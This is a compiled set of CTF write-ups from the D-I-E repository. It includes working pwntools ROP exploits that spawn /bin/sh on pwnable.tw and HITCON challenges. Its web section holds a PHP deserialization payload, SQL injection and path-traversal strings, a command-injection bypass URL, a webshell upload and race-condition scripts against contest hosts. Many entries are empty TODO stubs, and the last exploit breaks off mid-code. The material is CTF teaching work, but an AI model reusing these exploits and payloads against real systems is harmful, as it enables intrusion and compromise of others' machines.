<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-d-i-e
description: CTF writeups and security challenges by D-I-E.
---

# Writeups by D-I-E

Source repository: `/repos/D-I-E`

## Repository Index

- writeups/readme.md
- writeups/2017-hitcon-quals/readme.md
- writeups/pwnable.tw/readme.md
- writeups/pwnable.tw/pwn-Silver Bullet/readme.md
- writeups/pwnable.tw/pwn-Start/readme.md
- writeups/pwnable.tw/pwn-applestore/readme.md
- writeups/pwnable.tw/pwn-calc/readme.md
- writeups/pwnable.tw/pwn-dubblesort/readme.md
- writeups/pwnable.tw/pwn-hacknote/readme.md
- writeups/pwnable.tw/pwn-orw/readme.md
- writeups/2017-hitcon-quals/crypto-Luaky/readme.md
- writeups/2017-hitcon-quals/crypto-SSSP/readme.md
- writeups/2017-hitcon-quals/crypto-Secret-Server-Revenge/readme.md
- writeups/2017-hitcon-quals/crypto-Secret-Server/readme.md
- writeups/2017-hitcon-quals/crypto-Very-Luaky/readme.md
- writeups/2017-hitcon-quals/misc-Baby-Ruby-Escaping/readme.md
- writeups/2017-hitcon-quals/misc-Easy-to-say/readme.md
- writeups/2017-hitcon-quals/misc-Re-Easy-to-say/readme.md
- writeups/2017-hitcon-quals/misc-Two/readme.md
- writeups/2017-hitcon-quals/pwn-Baby-FS/readme.md
- writeups/2017-hitcon-quals/pwn-Damocles/readme.md
- writeups/2017-hitcon-quals/pwn-Ghost-in-the-heap/readme.md
- writeups/2017-hitcon-quals/pwn-Impeccable-Artifact/readme.md
- writeups/2017-hitcon-quals/pwn-Ragnarok/readme.md
- writeups/2017-hitcon-quals/pwn-Real-Ruby-Escaping/readme.md
- writeups/2017-hitcon-quals/pwn-Secret-FS/readme.md
- writeups/2017-hitcon-quals/pwn-bigLITTLE/readme.md
- writeups/2017-hitcon-quals/pwn-start/readme.md
- writeups/2017-hitcon-quals/reverse-Everlasting-Imaginative-Void/readme.md
- writeups/2017-hitcon-quals/reverse-Fantastic-Seamless-Textile/readme.md
- writeups/2017-hitcon-quals/reverse-Sakura/readme.md
- writeups/2017-hitcon-quals/reverse-Seccomp/readme.md
- writeups/2017-ctfs/20170602-TCTF-Final/readme.md
- writeups/2017-ctfs/20170610-GCTF-Quals/misc-reverseMe/readme.md
- writeups/2017-ctfs/20170610-GCTF-Quals/misc-stage1/readme.md
- writeups/2017-ctfs/20170610-GCTF-Quals/misc-testpyc/readme.md
- writeups/2017-ctfs/20170610-GCTF-Quals/reverse-debug/readme.md
- writeups/2017-ctfs/20170610-GCTF-Quals/web/readme.md
- writeups/2017-ctfs/20170602-TCTF-Final/pwn-upxof/readme.md
- writeups/2017-ctfs/20170602-TCTF-Final/pwn-world_of_fastbins/readme.md
- writeups/2017-ctfs/20170602-TCTF-Final/reverse-oldtimes/readme.md
- writeups/2017-ctfs/20170602-TCTF-Final/reverse-oldtimes/exp/README.md

## Writeup Content


### File: writeups/2017-ctfs/20170602-TCTF-Final/reverse-oldtimes/exp/README.md

rsa-wiener-attack
=================

A Python implementation of the Wiener attack on RSA public-key encryption scheme.

It uses some results about continued fractions approximations to infer the private key from public key in the cases the encryption exponent is too small or too large.



### File: writeups/2017-ctfs/20170602-TCTF-Final/pwn-upxof/readme.md

# upxof

This is quite an interesting challenge. I didn't solve it in the CTF since I know nothing about that ld trick.

But from this challenge, I learned a lot about ld trick, auxv etc.


# tl;dr
Abuse the auxv struct before uncompress process to bypass canary, and then ROP to run shellcode on rwx mappings mmaped by UPX uncompress process.

# Analysis

We are given a elf which can run directly, but asking us for password.

If you are in luck, you may find out that its password is actually 12345678, quite weak password.
You can analysis from IDA, with gdb tell you the start point as well. From a cmp assembly instruction, you can still get the password easily.

Well, if you have read the assembly code, you can also find out that the check is not so sufficient.
No length is checked. And the compare instruction makes the string truncated, so anything after that 12345678 password will not affect our result.

After that password, we get a chance to input any length string. To analysis this, you may just use upx to uncompress the elf. And, you'll see that this is from the uncompressed code, while the password thing is not.

So, we are getting clear. There is a vulnerability in the password input part and, of course the go part. But! The go part is from uncompressed code, and, it is canary-protected.

The question is that how can we bypass the canary?

# Where is canary born?

Now it is time to get some extra knowledge. Where is canary born? I mean, how is it initialized?

Well, it is actually generated from the linux kernel. But! It is transformed by some Auxiliary Vector!

Auxiliary Vector is at the top of the stack, it can be NULL actually, but if it is not NULL, you can get information from it.
And, the information is provided for the ld.so.

To see what auxv like, you can set the environment like this:
```shell
[anciety@anciety-pc upxof]$ LD_SHOW_AUXV=1 ./upxof_raw
password:12345678
AT_SYSINFO_EHDR: 0x7ffc17937000
AT_HWCAP:        bfebfbff
AT_PAGESZ:       4096
AT_CLKTCK:       100
AT_PHDR:         0x400040
AT_PHENT:        56
AT_PHNUM:        9
AT_BASE:         0x0
AT_FLAGS:        0x0
AT_ENTRY:        0x4005e0
AT_UID:          1000
AT_EUID:         1000
AT_GID:          1000
AT_EGID:         1000
AT_SECURE:       0
AT_RANDOM:       0x7ffc17855509
AT_EXECFN:       ./upxof_raw
AT_PLATFORM:     x86_64
let's go:
```

You can also use gdb to do this, just type `info auxv`, you will get similar input.

And the auxv struct is like this:
```c
typedef struct
{
        int a_type;                     /* Entry type */
        union
        {
                long int a_val;         /* Integer value */
                void *a_ptr;            /* Pointer value */
                void (*a_fcn) (void);   /* Function pointer value */
        } a_un;
} Elf32_auxv_t;
```
This is an entry struct. Take AT_HWCAP as example, the structure will be `p64(entry_type_no) + a_un`, where a_un is of 8 bytes long(under 64-bits).

Now we know about auxv, what else? Well, it seems that AT_RANDOM is an interesting variable that we should pay attention to.

This is something from the libc, and it does the stuff about canary. Actually, it sets the canary.

```c
static inline uintptr_t __attribute__ ((always_inline))
_dl_setup_stack_chk_guard (void *dl_random)
{
  union
  {
    uintptr_t num;
    unsigned char bytes[sizeof (uintptr_t)];
  } ret = { 0 };

  if (dl_random == NULL)
    {
      ret.bytes[sizeof (ret) - 1] = 255;
      ret.bytes[sizeof (ret) - 2] = '\n';
    }
  else
    {
      memcpy (ret.bytes, dl_random, sizeof (ret));
#if BYTE_ORDER == LITTLE_ENDIAN

      ret.num &= ~(uintptr_t) 0xff;
#elif BYTE_ORDER == BIG_ENDIAN

      ret.num &= ~((uintptr_t) 0xff << (8 * (sizeof (ret) - 1)));
#else

#error "BYTE_ORDER unknown"

#endif

    }
  return ret.num;
}
```

From this, we can see that the canary is set by dl_random. That is, if we are able to change the auxv struct before it is load, when it call ld, we can control the canary!

# Solve
1. Overflow into auxv, to control the canary before ld is called.
2. Bypass the canary, then we can do ROP.
3. Use ROP to call gets again, write shellcode into a rwx mapping. We have rwx mapping because the UPX needs it.
4. ROP jumps to the shellcode start point, and done.

# Notice
## To debug
The debug process is a little bit trickier than I ever thought. You can not just use `n` command to do everything, it may be broken! And step to the entry point of the uncompressed code is not so easy.
You need to do following steps:
1. run the binary, and let gdb attached to the running process(obviously)
2. now, before you continue, set a breakpoint at 0x400c93, and then, continue
3. do some 'n' command, until the instruction `call 0x800d14`
4. now, use 's' command to step in, then you will be at 0x800d14, set another breakpoint at 0x800d9d, continue.
5. use 's' command then, unless you are dealing with a call instruction, use 'n' command to step over that. DO NOT JUST USE N COMMAND! You will see how gdb tricks you if you do that.
6. now, use 's' command to step the instructions unless you are executing a call instruction. Do this until you get the address, 0x400604
7. Do the same, until you get some call rax, step into it(by using 's'), you will be at the entry of the uncompressed code.

This can be very annoying actually, I can't get a better solution since whenever I try to skip some part by using breakpoint and continue command, the gdb plays tricks with me, and I get confusing results.

## UPX, RWX and ROP
I don't know much about UPX, but during the debugging, I found that it actually did a lot things.
1. More mappings, some of them are RWX. In this challenge, at least 0x601000-0x602000 address is RWX, we can use that to write and execute shellcode.
2. The uncompress process is copied to 0x800000(as I remembered), and the original code, which is from 0x400000 will be the uncompressed code. So, to use ROP gadgets, you should find the gadgets inside the upx uncompressed binary. And you don't need to worry about the address since it adjusted the address it self.

## auxv
The auxv structure above is everything. The at_random address gdb tells you is found using that structure. So, you CANNOT just use the address of at_random `info auxv` to see if the at_random is modified. Actually, at_random's address is contained in that structure, it is like `p64(0x19) + p64(at_random_addr)`. To actually modify the at_random, the only thing you can do is to modify that address followed by the 0x19 number in the auxv. Changed it to point to some address which we already know the contents. (I used the address which is initiated to zero here)

# exp.py
see the exp.py in this directory

# References
1. http://phrack.org/issues/58/5.html 
2. https://www.elttam.com.au/blog/playing-with-canaries/



### File: writeups/2017-ctfs/20170602-TCTF-Final/pwn-world_of_fastbins/readme.md

# world of fastbin

This is a quite simple challenge, and there is so many ways to solve it. I present what I used during the competiton here.

# Analysis
Quite a simple binary, the vulnerability is very simple to find. The fill function has not checked the length. So you can actually input string of any length which will cause heap overflow.

But if you do checksec the binary, you'll understand when the challenge becomes hard.
We have almost all the protection here.

# Solution
## leak the heap
We have PIE and ASLR here, we need to get some address so we can get further.

To leak the heap address, since the malloc length is set to at most 0x5f(which is 0x60 internally), we almost always use the fastbin. Well, almost, we'll see that later. When we free 2 fastbins, the second one's FD will points to the first one. That is great, since that is a heap address. But to read that, we need to use the fill function to overflow something.

We use the fill to overflow the size of the next chunk, so, when free, we get a chunk bigger than its recorded size. That will give us an overlap, which may contain the next chunk. Then let the next chunk be the second fastbin chunk to be freed, we get the heap address.

## leak the libc address
libc address is almost the same. Get some overlap, and read the freed chunk. The difference is that we have to free some small bin. Since small bin is a double-linked list, when it is empty, we'll get a freed chunk whose FD and BK point to some address in main_arena, which is a global variable in libc.Then we can get the libc address. To get the offset, I recommand the [script](https://github.com/Escapingbug/get_main_arena) written by me to get main_arena offset from any libc.

## control flow hijack
I used the trick of the HITCON 2016 challenge "house of orange". That is, we use the unsorted bin attack to attack the _IO_list_all variable in libc. Since the content of that _IO_list_all variable is not chunk-looked, we'll get an exception. When facing exception, libc will flush the IO, using the _IO_list_all it self! So, we change the _IO_list_all to somewhere in main_arena, since we can control some of the address (the bins address) partially, we can get this work by use a fake file struct. This is almost the same as that challenge. Search for some writeups, there are plenty of them, and I don't want to add one more.

# Notice
The libc given is version 2.19, the smallbin trick to get libc base address depends on the libc we use, since the main_arena is at data section not code. So the length of libc is extremely important. Do aware that. I even changed to ubuntu 14.04 to make this done.

# exp.py
final exploit is presented in the same directory. Note that this exploit not always work, you may need several times. That is because the house of orange trick depends on some condition in the IO fresh process. And since we cannot fully control that process, we can only hope that the condition can be passed. Fortunately, that condition is very likely to be passed, so this exploit works if you try several times.



### File: writeups/2017-ctfs/20170602-TCTF-Final/readme.md




### File: writeups/2017-ctfs/20170602-TCTF-Final/reverse-oldtimes/readme.md

# Writeup

1. 执行file命令，分析结果为32位ELF文件。

```
$ file oldtimes 
oldtimes: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=fd699ac1d63ac81afca3155011beeb2b91f974a3, stripped
```

2. 用ida导入文件并利用f5反编译分析程序逻辑，发现一处64字节输入经0x08048B03，0x0804875A，0x08048AEC三个函数处理即可到达正确输出位置。

```c
LOBYTE(v1) = sub_8048B03(&v15, &v15, &s, 64, &unk_804A420);
if ( v1 )
{
  puts("Incorrect.");
  result = 0;
}
else
{
  sub_804875A(&v14, &v15, &unk_804A1A0, &unk_804A060, 0x140u);
  if ( sub_8048AEC(&v4 == 0, &v14, &unk_804A2E0, 320) )
  {
    puts("Correct.\nCongratulations!");
    result = 0;
  }
  else
  {
    puts("Incorrect.");
    result = 0;
  }
}
```

3. 0x08048B03处函数分析，发现是将输入字符串经过一次映射并扩充至最多64个字节的数组并返回，数组表示一个十进制数。

4. 0x0804875A处函数分析，发现是快速幂取模的汇编代码，输入是0x08048B03结果以及两个定值，输出是快速幂取模的结果。其中0x08048AD8处函数是判断数组表示的十进制数是否为0，0x08048AB3处函数是取数组表示的十进制数最低bit的值，0x08048612处函数是计算两数乘积并将结果对0x0804A060处定值取模。在0x08048612处函数中，0x08048A70处函数是计算两数之和并将结果对0x0804A060处定值取模。

5. 0x08048AEC处函数分析，发现是判断0x0804875A输出结果与给定数组0x0804A2E0做比较。

6. 因此可以抽象成如下代码，其中x未知，a，e，n已知。其形式与rsa加密／解密一致，通过查阅flappypig关于rsa的文章，发现可以利用Wiener Attack分解n，从而计算另一密钥解出x，进而根据映射计算flag。

```python
if (x**e) % n == a:
    print 'Correct'
else:
    print 'Incorrect'
```

# Exp

```python
from RSAwienerHacker import *

e = 65326441199468453286318255077403579659791312164553127869260446442105779909064937488537560101781375987673235379770584320200902922242466357110710512224365096172037200923774406729082247857808967592679310852236885503191205805867846536002124193676637708886499398965506519247168289750006311551455779911863709319947

n = 106491733927966194442570111833195971964540708710920248828539833058388088046807126527055336225402088921783018876076946794272419044969606936676842530973101509230963945247110105556900247885580601951941082462702181710167276943785261576473507495128333901938830998211916498162015185298755857306262703571421288351501

a = 33622269493924708607616624997424398912036927135599622278786063601678887543600400094409392433011134767526461813770729744913267138041445567265417022865204844947994077429853354378479239765411140344806650450747715214836133182538012671115882981194344900010564346012743782146937616191257888190694561289344531933844

d = hack_RSA(e, n)

def mul(x, y, z):
    ret = 1
    while y > 0:
        if y & 1:
            ret = (ret * x) % z
        x = (x * x) % z
        y >>= 1
    return ret

str_map = map(ord, '00FFFFFFFFFFFFFFFF2E002F133EFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF3C5737624E474A404B03115F0E0B3546535A163849450D325D43612A1F282609274D083D5522440134562D480A0C421E30204C103F2B0729064F1733391B12193B05043A18516352151C5B1A251D212C545E506024025C58413631230F5914FF'.decode('hex'))

plain = str(mul(a, d, n))

ans = ''

for i in range(0, len(plain), 2):
    tmp = int(plain[i]+plain[i+1], 10)
    ans += chr(str_map.index(tmp))

print ans[::-1]
```

# Other writeups and resources

1. [CTF中RSA的常见攻击方法](http://bobao.360.cn/learning/detail/3058.html)
2. [wiener attack](https://github.com/pablocelayes/rsa-wiener-attack)


### File: writeups/2017-ctfs/20170610-GCTF-Quals/misc-reverseMe/readme.md

# Writeup

1. 观察到头尾发现反序jpg的magic number（FF D8和FF D9），用python将字节逆过来即可看到flag图片。

# Exp

```python
f=open('flag.jpg','wb')
f.write(open('reverseMe','rb').read()[::-1])
```

# Other writeups and resources

(NONE)



### File: writeups/2017-ctfs/20170610-GCTF-Quals/misc-stage1/readme.md

# Writeup

1. 拿到图片，使用Stegsolve.jar，在gray panel发现一个反色二维码，使用mac预览实现反色。

2. 扫描得到一串十六进制数，发现头部`03F30D0A`是pyc的magic number。

3. python导入后执行dir发现有一个flag函数，执行后得到flag。

# Exp

(NONE)

# Other writeups and resources

(NONE)



### File: writeups/2017-ctfs/20170610-GCTF-Quals/misc-testpyc/readme.md

# Writeup

1. 用dis和uncompile2查看pyc，得到完整的str串。

2. 观察得到flag3函数的逻辑，将给出字符串逆过来解base64再逆过来并且每个字符减一即可。

# Exp

```python
a = '=cWbihGfyMzNllzZ0cjZzMWN5cTM4YjYygTOycmNycWNyYmM1Ujf'

import base64

print ''.join(map(lambda x: chr(ord(x)-1), base64.b64decode(a[::-1])))[::-1]
```

# Other writeups and resources

(NONE)



### File: writeups/2017-ctfs/20170610-GCTF-Quals/reverse-debug/readme.md

# Writeup

用ILSpy观察逻辑，发现过一个check就行，根据逻辑写出下面exp得到flag。

# Exp

```python
def trans(a, b):
	return [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113][b]^a

print trans(1,10)

def cal(a, b):
	for i in a:
		i = ord(i)
		for j in range(1,15):
			i = trans(i, j)
		b += chr(i)
	return b

import hashlib

b = cal('CreateByTenshine','')

m = hashlib.md5()

m.update(b)

print 'flag{' + m.hexdigest().upper() + '}'

```

# Other writeups and resources

(NONE)



### File: writeups/2017-ctfs/20170610-GCTF-Quals/web/readme.md

#### PHP序列化：
可以直接看到index.php的源码:
``` php
<?php
//error_reporting(E_ERROR & ~E_NOTICE);
ini_set('session.serialize_handler', 'php_serialize');
header("content-type;text/html;charset=utf-8");
session_start();
if(isset($_GET['src'])){
    $_SESSION['src'] = $_GET['src'];
    highlight_file(__FILE__);
    print_r($_SESSION['src']);
}
?>
<!DOCTYPE HTML>
<html>
 <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <title>代码审计2</title>
 </head>
 <body>
 在php中，经常会使用序列化操作来存取数据，但是在序列化的过程中如果处理不当会带来一些安全隐患。
<form action="./query.php" method="POST">        
<input type="text" name="ticket" />               
<input type="submit" />
</form>
<a href="./?src=1">查看源码</a>
</body>
</html>
```
然后访问query.php的时候提示：
> Look me: edit by vim ~0~

试了一下vim备份文件的后缀，query.php~可以读到源码：
``` php
//query.php 部分代码
session_start();
header('Look me: edit by vim ~0~')
//......
class TOPA{
	public $token;
	public $ticket;
	public $username;
	public $password;
	function login(){
		//if($this->username == $USERNAME && $this->password == $PASSWORD){ //抱歉
		$this->username =='aaaaaaaaaaaaaaaaa' && $this->password == 'bbbbbbbbbbbbbbbbbb'){
			return 'key is:{'.$this->token.'}';
		}
	}
}
class TOPB{
	public $obj;
	public $attr;
	function __construct(){
		$this->attr = null;
		$this->obj = null;
	}
	function __toString(){
		$this->obj = unserialize($this->attr);
		$this->obj->token = $FLAG;
		if($this->obj->token === $this->obj->ticket){
		   return (string)$this->obj;
		}
	}
}
class TOPC{
	public $obj;
	public $attr;
	function __wakeup(){
		$this->attr = null;
		$this->obj = null;
	}
	function __destruct(){
		echo $this->attr;
	}
}
```
很明显需要序列化。在index.php里面设置了php的序列化handler是'php_serialize'，而query.php里面没有设置，也就是默认的'php'，所以可以利用session反序列化调用query.php里面的类。
只有TOPC有echo，分析了一下，构造顺序应该是：
> TOPC  >  TOPB  >  TOPA

其中有几个点：
###### 1. __wakeup可以通过改变属性数目大于实际数目绕过
###### 2. 通过建立引用关系使得$this->obj->token和$this->obj->ticket保持相等
###### 3. username和password可以直接取0，0弱等于字符串
试了一下，感觉线上的源码不太一样，会调用login，并且反序列化的时候会先反序列化内层的
构造payload：
> |O:4:"TOPC":3:{s:3:"obj";N;s:4:"attr";O:4:"TOPB":2:{s:3:"obj";N;s:4:"attr";s:84:"O:4:"TOPA":4:{s:5:"token";N;s:6:"ticket";R:2;s:8:"username";i:0;s:8:"password";i:0;}";}}

在index.php设置一下session，再访问query.php就行了
#### spring-css：
google了一下，有一个CVE的洞**[cve-2014-3625](https://github.com/ilmila/springcss-cve-2014-3625)**
链接里面有exp，读一下/etc/passwd，发现：
> flag:x:1000:1000:Linux User,,,:/home/flag:/etc/flag

根据提示再读/etc/flag
> http://218.2.197.232:18015/spring-css/resources/file:/etc/flag

#### 注入越权：
源码有提示：
``` html
<!--
2015.10.16
防越权改造，当uid=0且role=admin时显示管理员页面。
 -->   
```
发现uid可以直接修改，修改role不行，输引号会被mysql_escape_string拦 。
试了一下发现uid输反引号会报错，看了一下大概是update语句，所以可以注入设置role，引号不能用，就用admin的十六进制代替，也就是
> uid=0,role=0x61646d696e

修改后返回原页面，得到flag

#### 条件竞争：
题目给了源码，看了一下在reset密码时存在条件竞争漏洞，reset时有两步：
1. 先将该用户信息清空并新插入一条信息，这时notadmin为False
2. 然后再将notadmin设置为True

那么只要在第二步之前登录即可，所以跑两个程序，一个reset，一个login即可，我这里分别开了15个协程：
##### reset.py
``` py
import requests
from gevent import monkey
import gevent
monkey.patch_all()

def reset():
    for i in range(100):
        cookies = {'PHPSESSID':'crr472f26gv9ef64rcu39obu01'}
        a = requests.post("http://218.2.197.232:18009/index.php?method=reset",data={'name':'c610599c37103bf5','password':'zzm'},cookies=cookies).text
        print(a)

tasks = [gevent.spawn(reset) for i in range(15)]
gevent.joinall(tasks)
```
##### login.py
``` py
import requests
from gevent import monkey
import gevent
monkey.patch_all()

def login():
    for i in range(100):
        cookies = {'PHPSESSID':'crr472f26gv9ef64rcu39obu01'}
        b = requests.post("http://218.2.197.232:18009/login.php?method=login",data={'name':'c610599c37103bf5','password':'zzm'},cookies=cookies).text
        print(b)

tasks = [gevent.spawn(login) for i in range(15)]
gevent.joinall(tasks)
```
很快就能读到flag：

![image.png](http://upload-images.jianshu.io/upload_images/2511560-4006fb816f0c1a49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

#### 读文件：
只给了个1.txt可以读，试了一下加*不行，感觉不是命令执行，"../"返回上级目录也不行，猜测可能过滤了什么，在1.txt中间加上"./"发现仍能读取，说明"./"被过滤了，构造payload，在上级目录的flag.php的注释里读到flag
> http://218.2.197.232:18008/a/down.php?p=...//fla./g.php

#### Web综合：
发现有.svn泄露,下载下来sqlite数据库文件，找到settings.inc.php的checksum，然后在
> http://218.2.197.232:18007/.svn/pristine/c6/c63308801a9ec3b0c1aea96b061c00b1666adebb.svn-base

可以读到源代码，源码里有admin的密码，登陆上去可以上传图片，这里上传一个图片马就行了，只验证了content-type，菜刀连上去后，在07目录下找到f1a9.php
#### RCE绕过：
命令前后需要空格，但是被过滤，用%0a绕过，命令中的空格就不行了，fuzz一下，发现%09可以。另外"."也被过滤了，可以用*，于是直接读到flag.php：
> http://218.2.197.232:18006/?cmd=%0acat%09fla*%0a

#### JAVA序列化：
网上找了个JAVA序列化的例子，推测了一下大概的格式，然后把题目的object的id和name对应修改一下，再Base64就OK了
> rO0ABXNyAA9jb20uY3RmLmNuLlVzZXIAAAAAA/kvvQIAAkwAAmlkdAATTGphdmEvbGFuZy9JbnRlZ2VyO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABdAAFYWRtaW4=

#### 变态验证码怎么过：
网上搜了一下几种绕验证码的方式，都试了一下，发现只要第一次输对了验证码，后面直接把验证码设为空串就行了，然后用Burp和他给的password.txt爆破一下就行了

#### Forbidden：
注释提示要本机访问，各种改头部没用，后来发现改成localhost才行，也是醉了，然后后续每次修改都会有个提示，改Host啊，改Referer，改UA什么的，一步一步来就能得到最后flag

#### 热身题：
扫了一下目录发现robots.txt，挨个读了一下里面的文件，最后在rob0t.php里面读到flag


### File: writeups/2017-hitcon-quals/crypto-Luaky/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/crypto-SSSP/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/crypto-Secret-Server-Revenge/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/crypto-Secret-Server/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/crypto-Very-Luaky/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/misc-Baby-Ruby-Escaping/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/misc-Easy-to-say/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/misc-Re-Easy-to-say/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/misc-Two/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/pwn-Baby-FS/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/pwn-Damocles/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/pwn-Ghost-in-the-heap/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/pwn-Impeccable-Artifact/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/pwn-Ragnarok/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/pwn-Real-Ruby-Escaping/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/pwn-Secret-FS/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/pwn-bigLITTLE/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/pwn-start/readme.md

# poc
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

> 泄漏canary -> 栈溢出 -> ROP -> execve("/bin/sh", 0, 0)

栈溢出，由于数组在canary上面，因此可以泄漏至少相邻1Bcanary，找到可写位置写上"/bin/sh\x00"，通过ROP构造execve("/bin/sh", 0, 0)，需要用到ruby脚本。

# exp

```python
from pwn import *

p = remote('54.65.72.116', 31337)

payload = '''
p = Sock.new '127.0.0.1', 31338
pad = 0xdeadbeefdeadbeef
g1 = 0x00000000004125e3
s = '/bin/sh\x00'
g2 = 0x00000000004005d5
g3 = 0x000000000049e472
g4 = 0x00000000004017f7
g5 = 0x0000000000443776
g6 = 0x0000000000468e75
write_addr = 0x6ce000
canary = ''
for i in 0..7
    payload = 'a' * (0x18 + i) 
    p.send payload
    r = p.recvuntil '\x0a'
    if r.length == (0x18 + i + 1)
        canary += '\x00'
    else
        canary += r[0x18 + i]
    end
end

payload = 'a' * 0x18 + canary
payload += p64(pad)
payload += p64(g2) + p64(write_addr) + p64(g1)
payload += p64(g5) + s
payload += p64(g3)
payload += p64(g2) + p64(0x3b) + p64(g1)
payload += p64(g2) + p64(write_addr)
payload += p64(g4) + p64(0)
payload += p64(g5) + p64(0)
payload += p64(g6)
p.send payload
p.send 'exit\n'
p.sendline 'cat /home/start/flag'
print p.recv 10000000
print p.recv 10000000
'''

p.sendline(payload)
p.interactive()
```



### File: writeups/2017-hitcon-quals/readme.md

# contest
2017/11/04 02:00 UTC ~ 2017/11/06 02:00 UTC

freenode #hitconctf


# team

| key   | value             |
| -     | -                 | 
| Email | meinvshef@sina.cn |
| Team  | Northwest Wolf    |
| Score | 827               |
| rank  | 73                |


# solved

| Challenge         | Category  | Challenge | Category  |
| -                 | -         | -         | -         |
| Visual Acuity     | Misc	    | 50        | 2017-11-04 02:01:55 |
| BabyFirst Revenge | 🍊 Web    | 172       | 2017-11-04 09:13:54 |
| Start             | Pwn       | 132 | 2017-11-04 12:42:21 |
| Easy to say       | Misc      | 144 | 2017-11-05 00:40:10 |
| Data & Mining     | Misc      | 137 | 2017-11-05 03:02:32 |
| 完美無瑕 ~Impeccable Artifact~ | Perfection, Pwn | 192 | 2017-11-05 04:33:16 |



### File: writeups/2017-hitcon-quals/reverse-Everlasting-Imaginative-Void/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/reverse-Fantastic-Seamless-Textile/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/reverse-Sakura/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/2017-hitcon-quals/reverse-Seccomp/readme.md

# poc

(TODO)

#exp

(TODO)



### File: writeups/pwnable.tw/pwn-Silver Bullet/readme.md

# poc

```
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

> `strncat`逻辑漏洞 -> 栈溢出 -> 泄漏libc -> `system('/bin/sh\x00')`

在`power_up()`中`strncat`会把组合成的串最后添加一个`\x00`，而`main`里紧邻字符串`dest`的变量存的是`strlen(dest)`，因此可以覆盖该变量为`0`，从而重新计算长度后`strlen(dest) = strlen(src)`，再次`power_up()`可造成栈溢出。由于只有`beat()`返回值为`1`时`main()`正常返回，因此第二次`power_up()`考虑赋较大的值如`\xff\xff\xff`。

之后构造栈如下泄漏libc。

```
---------------
|     got     |
---------------
|    main()   |
---------------
| plt['puts'] |
---------------
|  0xdeadbeef |
---------------
|  0xffffff01 |
---------------
```

同理再来一轮，栈如下执行`system('/bin/sh\x00')`。

```
---------------
|    binsh    |
---------------
|    main()   |
---------------
|   system()  |
---------------
|  0xdeadbeef |
---------------
|  0xffffff01 |
---------------
```

# exp

```python
from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')

DEBUG = 0

f = ELF('silver_bullet.dms')

if DEBUG:
    p = process('silver_bullet.dms')
    gdb.attach(p)
    e = ELF('libc-2.23.so')
else:
    p = remote('chall.pwnable.tw', 10103)
    e = ELF('libc_32.so.6')

def create(s):
    p.recvuntil(':')
    p.send('1')
    p.recvuntil(':')
    p.send(s)
    p.recvuntil('!')

def power(s):
    p.recvuntil(':')
    p.send('2')
    p.recvuntil(':')
    p.send(s)
    p.recvuntil('!\n')

def beat():
    p.send('3')
    p.recvuntil('!!\n')

def finish():
    p.send('4')
    p.recvuntil('!')

# r1
pad = 0xdeadbeef
ret = 0x08048954 # once again

create('a' * 47)
power('a')
power('\xff' * 3 + p32(pad) + p32(f.plt['puts']) + p32(ret) + p32(f.got['printf']))
beat()

printf_addr = u32(p.recvuntil('\n')[:4])
libc_addr = printf_addr - e.symbols['printf']
system_addr = libc_addr + e.symbols['system']

# r2

binsh_addr = libc_addr + list(e.search('/bin/sh\x00'))[0]

create('a' * 47)
power('a')
power('\xff' * 3 + p32(pad) + p32(system_addr) + p32(ret) + p32(binsh_addr))
beat()

p.interactive()
```



### File: writeups/pwnable.tw/pwn-Start/readme.md

# poc

```
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
```

> 栈溢出 -> 泄漏栈地址 -> 将shellcode写在栈上 -> 执行`execve('/bin/sh\x00',0,0)`

由于栈可执行，考虑将shellcode写在栈上，栈溢出调用`write`输出程序一开始`push esp`的值获得栈地址，从而执行栈上shellcode。

# exp

```python
from pwn import *

DEBUG = 0

if DEBUG:
    context(log_level = 'debug')
    p = process('./start.dms')
    gdb.attach(p)
